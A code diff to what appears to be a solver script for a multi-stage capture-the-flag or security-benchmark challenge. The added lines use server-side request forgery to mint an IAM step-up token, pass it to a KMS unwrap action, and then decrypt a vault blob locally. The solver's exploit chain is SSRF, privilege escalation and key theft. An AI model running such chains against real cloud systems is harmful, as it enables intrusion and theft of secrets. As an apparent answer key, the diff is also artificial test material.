@@ -161,12 +161,15 @@ def solve(base: str, echo=print, state: dict = None) -> str:
         base_req = {"grant": grant}
         st.update(resource=resource, escalation_artifact=base_req)
     readresp = ssrf(f"{DEP}/deploy/run?p={b64u({**base_req, 'action': act_read})}")
-    marker(readresp)
+    marker(readresp)  # h5 privesc marker (deployment)
     blob = readresp["workload_output"]["blob"]
     wrapped = readresp["workload_output"]["wrapped_data_key"]
-    unwrapresp = ssrf(f"{DEP}/deploy/run?p={b64u({**base_req, 'action': act_unwrap, 'input': wrapped})}")
+    # hop 5c: the KMS unwrap needs a DISTINCT step-up identity (not infra-admin) — mint it, pass it through
+    stepup = ssrf(f"{IAM}/iam/stepup?p={b64u({'session': sess1})}")["stepup_token"]
+    unwrapresp = ssrf(f"{DEP}/deploy/run?p={b64u({**base_req, 'action': act_unwrap, 'input': wrapped, 'stepup': stepup})}")
+    marker(unwrapresp)  # h5b step-up / KMS-unwrap marker (cloudapp)
     dk = bytes.fromhex(unwrapresp["workload_output"]["data_key"])
-    st.update(blob=blob, data_key=dk.hex())
+    st.update(blob=blob, stepup=stepup, data_key=dk.hex())
 
     # ---- hop 6: decrypt the vault blob LOCALLY with the workload-unwrapped data key ------------
     iv, ct, tag = bytes.fromhex(blob["iv"]), bytes.fromhex(blob["ciphertext"]), bytes.fromhex(blob["tag"])
